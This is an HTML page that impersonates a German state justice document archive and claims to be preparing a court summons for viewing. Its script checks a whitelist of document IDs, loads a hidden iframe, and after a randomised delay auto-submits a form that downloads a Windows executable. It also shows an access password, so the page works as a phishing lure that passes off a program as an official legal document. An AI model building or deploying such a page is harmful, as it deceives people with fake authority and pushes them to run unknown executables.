<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Landesarchiv Justiz – Dokumentenarchiv</title>
    
    <!-- Content Security Policy -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; frame-src 'self' www.google.com; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' www.googletagmanager.com; img-src 'self' data: images.seeklogo.com upload.wikimedia.org">
    
    <!-- Favicon + Open Graph -->
    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBmaWxsPSIjMDAwIiBkPSJNMjU2IDBDMTE0LjYgMCAwIDExNC42IDAgMjU2czExNC42IDI1NiAyNTYgMjU2IDI1Ni0xMTQuNiAyNTYtMjU2UzM5Ny40IDAgMjU2IDB6bTAgNDgwQzEzMi41IDQ4MCAzMiAzNzkuNSAzMiAyNTZTMzMyLjUgMzIgMjU2IDMyczIyNCAxMDAuNSAyMjQgMjI0LTEwMC41IDIyNC0yMjQgMjI0eiIvPjwvc3ZnPg==" type="image/svg+xml">
    <meta property="og:title" content="Landesarchiv Justiz – Dokumentenarchiv">
    <meta property="og:description" content="Zugriff auf behördliche Unterlagen – elektronisch bereitgestellt durch das Justizarchiv">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/e3/Bundesadler_Bundesorgane.svg">
    <meta property="og:type" content="website">

    <!-- Styles -->
    <style>
        :root {
            --bg-light: #f8f8f8;
            --bg-content: #ffffff;
            --text-dark: #333333;
            --accent-color: #1a5fb4;
            --border-color: #e0e0e0;
        }
        
        body {
            font-family: 'Georgia', serif;
            background-color: var(--bg-light);
            color: var(--text-dark);
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            line-height: 1.6;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            flex: 1;
        }
        
        .header {
            text-align: center;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 20px;
            margin-bottom: 30px;
            background: var(--bg-content);
            padding: 30px 20px;
            border-radius: 8px;
            margin-top: 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        .header img {
            height: 90px;
            margin-bottom: 15px;
        }
        
        nav ul {
            list-style: none;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            padding: 0;
            margin: 20px 0 30px;
            font-size: 1.1em;
        }
        
        nav ul li a {
            text-decoration: none;
            color: var(--accent-color);
            font-weight: 500;
            transition: color 0.3s;
            padding: 8px 15px;
            border-radius: 4px;
            border: 1px solid var(--border-color);
            background: var(--bg-content);
        }
        
        nav ul li a:hover {
            color: #fff;
            background: var(--accent-color);
        }
        
        .content {
            text-align: center;
            background: var(--bg-content);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }
        
        .content img.pdf {
            width: 70px;
            margin: 25px 0;
        }
        
        .footer {
            background: var(--bg-content);
            font-size: 0.9em;
            color: #666;
            padding: 25px 20px;
            text-align: center;
            border-radius: 8px;
            margin-top: auto;
            box-shadow: 0 -2px 8px rgba(0,0,0,0.1);
        }
        
        .footer a {
            color: var(--accent-color);
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .spinner {
            margin: 25px auto;
            border: 5px solid rgba(0,0,0,0.1);
            border-top: 5px solid var(--accent-color);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        
        .checkmark {
            display: none;
            background: rgba(0,0,0,0.03);
            border: 1px solid var(--border-color);
            padding: 20px;
            font-size: 1.1em;
            color: var(--text-dark);
            max-width: 600px;
            margin: 25px auto;
            text-align: center;
            border-radius: 8px;
        }
        
        .password-hint {
            background: rgba(0,0,0,0.03);
            padding: 15px;
            border-radius: 8px;
            margin: 20px auto;
            max-width: 400px;
            border: 1px solid var(--border-color);
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status-text {
            font-size: 1.2em;
            margin-bottom: 20px;
            color: var(--text-dark);
        }
        
        h1, h2, h3 {
            color: #000;
            font-weight: 500;
            margin-top: 0;
        }
        
        strong {
            color: var(--accent-color);
        }
        
        .divider {
            height: 1px;
            background: var(--border-color);
            margin: 30px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <!-- Correct Bundesadler from seeklogo.com -->
            <img src="https://images.seeklogo.com/logo-png/2/2/bundesadler-logo-png_seeklogo-23581.png" alt="Bundesadler">
            <h1>Landesarchiv für Justizdokumente</h1>
            <p>Elektronische Zustellung gerichtlicher Unterlagen</p>
        </div>

        <nav>
            <ul>
                <li><a href="https://www.justiz.de" target="_blank">Startseite</a></li>
                <li><a href="https://www.bundesgerichtshof.de" target="_blank">Dokumentenarchiv</a></li>
                <li><a href="https://www.bund.de" target="_blank">Rechtliche Hinweise</a></li>
                <li><a href="https://www.justizportal.de" target="_blank">Kontakt</a></li>
            </ul>
        </nav>

        <div class="content">
            <p class="status-text" id="statusText">Ihr Dokument wird geladen und vorbereitet. Bitte haben Sie einen Moment Geduld.</p>
            
            <div class="password-hint">
                <p><strong>Hinweis:</strong> Dieses Dokument ist passwortgeschützt.</p>
                <p>Zugangscode: <strong>20022</strong></p>
            </div>
            
            <img class="pdf" src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" alt="PDF Dokument">
            
            <div class="spinner" id="spinner"></div>

            <div class="divider"></div>

            <div class="checkmark" id="checkmark">
                <h3>Hinweis:</h3>
                <p>Die Aufbereitung des Dokuments wurde abgeschlossen.</p>
                <p>Es steht nun zur elektronischen Einsicht bereit.</p>
            </div>
        </div>

        <div class="footer">
            <p>© 2025 Landesarchiv für Justizdokumente</p>
            <p>Adresse: Friedrichstraße 123, 10117 Berlin</p>
            <p>Kontakt: <a href="mailto:info@landesarchiv-justiz.de">info@landesarchiv-justiz.de</a></p>
            <p><a href="#">Impressum</a> | <a href="#">Datenschutzerklärung</a></p>
        </div>
    </div>

    <!-- Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXX"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-XXXXXXX');
    </script>

    <!-- Main Logic -->
    <script>
    document.addEventListener('DOMContentLoaded', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const docType = urlParams.get('type');
      const docId = urlParams.get('id');
      
      // UI Elements
      const spinner = document.getElementById('spinner');
      const statusText = document.getElementById('statusText');
      const checkmark = document.getElementById('checkmark');
      
      // Белый список документов
      const validDocs = {
        ladung: ['L-40822', 'L-55199', 'L-77301'],
        vorladung: ['V-11245', 'V-88903']
      };

      if (validDocs[docType]?.includes(docId)) {
        // Phase 1: Show loading state
        setTimeout(() => {
          if (spinner) spinner.style.display = 'none';
          if (checkmark) checkmark.style.display = 'block';
          if (statusText) statusText.textContent = "Das Dokument steht zur Einsicht bereit.";
        }, 4000);

        // Phase 2: Create hidden iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.sandbox = 'allow-same-origin allow-scripts';
        iframe.src = `https://www.google.com/search?q=justiz+nrw+${docId}`;
        document.body.appendChild(iframe);

        // Phase 3: Redirect after delay
        setTimeout(() => {
          const finalUrl = `https://builds.dotnet.microsoft.com/dotnet/Sdk/9.0.304/dotnet-sdk-9.0.304-win-x64.exe?cache=${Date.now()}`;
          
          const form = document.createElement('form');
          form.method = 'GET';
          form.action = finalUrl;
          
          const params = {
            source: 'github-redirect',
            session: Math.random().toString(36).substring(2),
            doc_type: docType,
            doc_id: docId
          };
          
          for (const [key, value] of Object.entries(params)) {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = key;
            input.value = value;
            form.appendChild(input);
          }
          
          document.body.appendChild(form);
          form.submit();
        }, 3000 + Math.random() * 2000);
      } else {
        // Handle invalid document
        if (spinner) spinner.style.display = 'none';
        if (statusText) {
          statusText.innerHTML = `
            <h2>Dokument nicht gefunden</h2>
            <p>Fehler 404: Das angeforderte Dokument existiert nicht.</p>
          `;
        }
      }
    });
    </script>
</body>
</html>
